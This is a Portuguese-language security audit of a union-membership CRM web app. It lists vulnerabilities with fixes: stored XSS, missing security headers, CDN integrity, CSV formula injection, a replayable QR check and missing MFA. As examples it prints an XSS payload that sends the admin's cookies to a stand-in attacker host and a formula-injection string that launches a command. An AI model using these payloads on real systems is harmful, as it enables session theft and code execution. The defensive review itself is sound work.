# SindCore — Novas Medidas de Segurança (Revisão Profunda)
### Achados adicionais para deixar o projeto mais profissional e seguro antes da comercialização

> Complemento ao `SindCore_Plano_Seguranca_Comercial.md`. Este documento contém **só** os achados da segunda rodada de revisão (renderização de DOM, headers HTTP, integridade de CDN, exportação de dados e mecanismo de QR Code).

---

## 1 — 🔴 CRÍTICO: XSS armazenado via `innerHTML` com dados públicos não sanitizados

Em `dashboard.html` e `financeiro.html`, o nome, empresa, cargo e WhatsApp do sócio são inseridos direto no DOM via `innerHTML` com template string, sem nenhum escape:

```js
// dashboard.html, linha ~151
tbody.innerHTML = lista.map(socio => `
  ...
  <td>${socio.nome_completo}</td>
  ...
`)

// financeiro.html, lista de inadimplentes
itens += `<div class="inadi-item">
  <div class="inadi-nome">${s.nome_completo}</div>
  <div class="inadi-info">${s.empresa || 'Empresa não informada'}</div>
  ...
</div>`
```

O problema: `nome_completo`, `empresa`, `cargo` e `whatsapp` vêm **direto do formulário público de filiação**, que qualquer pessoa não autenticada pode preencher com o que quiser — não há sanitização de HTML/JS nesses campos, só validação de obrigatoriedade. Isso significa que **qualquer um na internet pode se filiar com um nome como**:
```
<img src=x onerror="fetch('https://atacante.com/roubo?c='+document.cookie)">
```
**e o script executa dentro da sessão autenticada do admin** na próxima vez que ele abrir o dashboard ou a tela de inadimplentes. Como o CRM já está logado via Supabase Auth nesse momento, o impacto potencial é sério: roubo de sessão/token do admin, exportar todos os dados de sócios para um servidor externo, aprovar/recusar filiações, alterar adimplência — tudo isso a partir de uma filiação maliciosa que nem precisa ser aprovada para o ataque disparar (o dashboard lista pendentes também).

Por outro lado, `detalhe.html` faz o certo (`document.getElementById('nome-socio').textContent = socio.nome_completo` — `textContent` escapa automaticamente). O problema está isolado em `dashboard.html` e `financeiro.html`.

**Correção — duas opções, ambas válidas:**

**Opção simples (escapar antes de interpolar):**
```js
function escapeHTML(str) {
  if (str == null) return ''
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

// uso:
tbody.innerHTML = lista.map(socio => `
  <td>${escapeHTML(socio.nome_completo)}</td>
`)
```

**Opção mais robusta (construir os nós sem `innerHTML` para o conteúdo variável):**
```js
const td = document.createElement('td')
td.textContent = socio.nome_completo   // texto vira texto, nunca HTML
tr.appendChild(td)
```

Recomendo a função `escapeHTML()` central num arquivo utilitário (ex.: `js/utils.js`) usada em **todo** lugar que interpola dado de sócio dentro de `innerHTML` — isso inclui revisar `importar.html` (preview da planilha) também, já que o conteúdo de uma planilha importada pode ter a mesma origem (poderia ter sido criada a partir de uma exportação anterior contaminada, por exemplo).

---

## 2 — Nenhum header de segurança HTTP configurado

Conferido: o `.htaccess` atual só tem `Options -Indexes` e bloqueio de extensão — **não há CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy nem Permissions-Policy**. Isso é fácil de corrigir e barato (zero custo de performance):

```apache
<IfModule mod_headers.c>
  Header always set X-Frame-Options "DENY"
  Header always set X-Content-Type-Options "nosniff"
  Header always set Referrer-Policy "strict-origin-when-cross-origin"
  Header always set Permissions-Policy "geolocation=(), microphone=(), camera=(self)"
  Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
  Header always set Content-Security-Policy "default-src 'self'; script-src 'self' https://js.hcaptcha.com https://cdn.jsdelivr.net https://esm.sh; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://*.supabase.co; connect-src 'self' https://*.supabase.co https://api.ipapi.is; frame-src https://*.hcaptcha.com"
</IfModule>
```
> `camera=(self)` é necessário porque a carteira usa a câmera para a foto. Ajustar o CSP testando em homologação antes — é comum precisar de 1-2 rodadas de ajuste fino para não quebrar nenhum recurso (hCaptcha, fontes, Supabase Storage).

O CSP, em particular, é uma segunda camada de defesa contra o XSS do item 1: mesmo que um payload escape por algum lugar não revisado, um CSP bem configurado bloqueia a execução de script inline/externo não autorizado.

---

## 3 — CDN sem versão fixada e sem integridade (SRI)

- `supabase.js` importa `https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm` **sem pinar versão** — uma atualização da lib publicada pelo mantenedor entra em produção automaticamente, sem teste, sem aviso. Pin: `.../npm/@supabase/supabase-js@2.45.0/+esm` (trocar pela versão validada).
- `jspdf@2.5.1` e `qrcodejs@1.0.0` já são importados com versão fixa (bom), mas nenhum `<script>` externo tem atributo `integrity`/`crossorigin` (Subresource Integrity). Sem isso, se o CDN for comprometido, o navegador carrega o que vier, sem checagem:
```html
<script src="https://cdn.jsdelivr.net/npm/jspdf@2.5.1/dist/jspdf.umd.min.js"
        integrity="sha384-HASH_AQUI" crossorigin="anonymous"></script>
```
(o jsdelivr gera o hash automaticamente — basta acessar a URL com `?sri` ou usar `https://www.srihash.org/`). hCaptcha não pode ter SRI (o script muda dinamicamente por design), então esse fica de fora.

---

## 4 — Injeção de fórmula no CSV exportado (CSV/Excel Formula Injection)

Em `dashboard.js`, `exportarParaCSV()` monta o CSV direto com os valores do sócio:
```js
const linhas = socios.map(socio => [socio.nome_completo, ...])
const csv = [...linhas.map(linha => linha.map(cell => `"${cell}"`).join(','))].join('\n')
```
Se um sócio se cadastrar com `nome_completo` começando em `=`, `+`, `-` ou `@` (ex.: `=cmd|'/c calc'!A1`), o Excel/Sheets pode interpretar isso como **fórmula executável** quando o admin abre o CSV exportado — uma classe de vulnerabilidade conhecida (CSV Injection / Formula Injection). Correção simples:
```js
function sanitizarCelulaCSV(valor) {
  const str = String(valor ?? '')
  return /^[=+\-@]/.test(str) ? `'${str}` : str   // prefixa aspas simples — neutraliza a fórmula
}
// usar sanitizarCelulaCSV(cell) no lugar de cell direto, antes de envolver em aspas
```

---

## 5 — QR Code "anti-fraude" pode estar protegendo só visualmente

A RPC `verificar_carteira(p_carteira_id UUID)` recebe só o ID da carteira — **não recebe nem valida nenhum timestamp**. Então, mesmo que o QR exibido na tela regenere visualmente, a verificação por trás aceita o mesmo `carteira_id` indefinidamente (até a carteira vencer). Na prática isso significa que **um print do QR continua validando como "ativo"** sempre que escaneado, o que esvazia o propósito do mecanismo. Se o QR dinâmico for mantido como recurso de produto, o ideal é a RPC também validar uma janela de tempo curta (ex.: um token assinado com expiração de 60s, não só o UUID fixo da carteira).

---

## 6 — Login do CRM sem segundo fator e sem limite de tentativas visível

`auth.js` usa só `signInWithPassword`. O Supabase Auth tem proteção básica contra força bruta por padrão, mas não há **MFA habilitado** nem confirmação de que captcha está ativo na tela de login do CRM (diferente do formulário público, que tem hCaptcha). Como o CRM concentra acesso a CPF, contracheque e documento de todos os sócios, vale: (1) habilitar MFA (TOTP) no Supabase Auth para contas admin, (2) considerar Turnstile também na tela de login do CRM, já que é alvo de credential stuffing assim que o subdomínio for descoberto.

---

## 7 — CPF em texto puro no banco (hardening opcional, não bloqueante)

Hoje `cpf` é `TEXT` simples — protegido por RLS, mas legível por qualquer um com acesso de `authenticated` (todo admin) ou em caso de dump de backup. Não é uma falha (é o padrão da maioria dos sistemas), mas para um produto que se vende como "seguro por design" para múltiplos sindicatos, criptografia de coluna via `pgcrypto` (`pgp_sym_encrypt`/`pgp_sym_decrypt`) no CPF é um diferencial de venda real — adiciona uma camada mesmo se a `service_role key` ou um backup for exposto. Custo: toda busca por CPF precisa passar por função de descriptografia (a RPC `buscar_socio_carteira` já não expõe o CPF de volta, então o impacto de implementar isso é baixo).

---

## Prioridade recomendada

1. **Item 1 — XSS armazenado** (corrigir primeiro; exploração trivial, impacto direto sobre a conta do admin)
2. **Item 2 — headers HTTP (CSP/HSTS/etc.)** — barato, rápido, fecha várias portas de uma vez e reforça a defesa contra o item 1
3. **Item 4 — CSV injection** no export (correção de uma função só)
4. **Item 6 — MFA + captcha no login do CRM**
5. **Item 3 — pin de versão + SRI nos CDNs**
6. **Item 5 — QR Code** (revisar se vale a pena, é mais baixo risco que os anteriores)
7. **Item 7 — CPF criptografado** (hardening opcional, fazer por último)

---

*Documento de apoio técnico — Liftcode / SindCore. Complemento ao plano de segurança comercial, baseado em revisão de código do SINTEENP-PB em produção.*
